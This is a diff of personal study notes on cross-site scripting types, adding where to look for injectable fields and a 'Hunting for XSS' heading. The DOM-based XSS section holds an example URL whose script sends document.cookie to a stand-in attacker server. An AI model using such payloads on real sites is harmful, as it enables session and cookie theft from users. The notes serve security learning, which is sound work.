@@ -6,6 +6,8 @@
     * Most dangerous type of XSS
     * <script> alert('XSS by Vickie'); </script>
     * Cookies and personal info could be stolen with XSS. But it can also change site contents and redirect to other sites.
+    * **Forms, search boxes, name, or username fields.**
+    * Sometimes menus or numeric fields can have XSS if you change their values in a proxy.
  * **Blind XSS** - a stored XSS that takes place someplace else in the application.
     * Harder to detect, you cant find them by lookinh got reflected input from the server.
     * Attacks can host their own server and if they see a response to that server, then that web application has that XSS vulnerability.
@@ -16,7 +18,9 @@
      * DOM specifies how HTML creates a webpage and how scripts modify it.
      * Targets local files saved on the browser.
      * jQuery alters the DOM is often vulnerable to these type of attacks.
-     * Can be embedded in fragments and URL parameters:
+     * **Can be embedded in fragments and URL parameters:**
          * h<span>ttps://example.com#about_us
          * h<span>ttps://example.com?locale=<script>location='http://attacker_server_ip/?c=+document.cookie;</script>
   * **Self-XSS** - a social engineering attack that tricks users into executing a XSS intructed by the attacker.
+
+   ### Hunting for XSS
